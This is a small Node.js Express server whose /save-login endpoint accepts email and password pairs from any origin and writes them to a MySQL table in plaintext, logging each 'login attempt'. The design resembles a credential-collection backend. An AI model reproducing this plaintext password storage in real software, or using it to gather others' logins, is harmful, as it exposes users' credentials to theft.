import express from "express";
import cors from "cors";
import mysql from "mysql2/promise";
import dotenv from "dotenv";

dotenv.config();

const app = express();

app.use(cors());
app.use(express.json());

const pool = mysql.createPool(process.env.DATABASE_URL);

app.post("/save-login", async (req, res) => {
  const { email, password } = req.body;
  console.log(`Received login attempt: ${email}`);

  try {
    await pool.query(
      "INSERT INTO logins(email, password) VALUES(?, ?)",
      [email, password]
    );

    console.log(`Successfully saved credentials for: ${email}`);
    res.json({
      success: true,
    });
  } catch (err) {
    console.log(err);

    res.status(500).json({
      error: "Database error",
    });
  }
});

app.listen(3001, () => {
  console.log("Server running on port 3001");
});
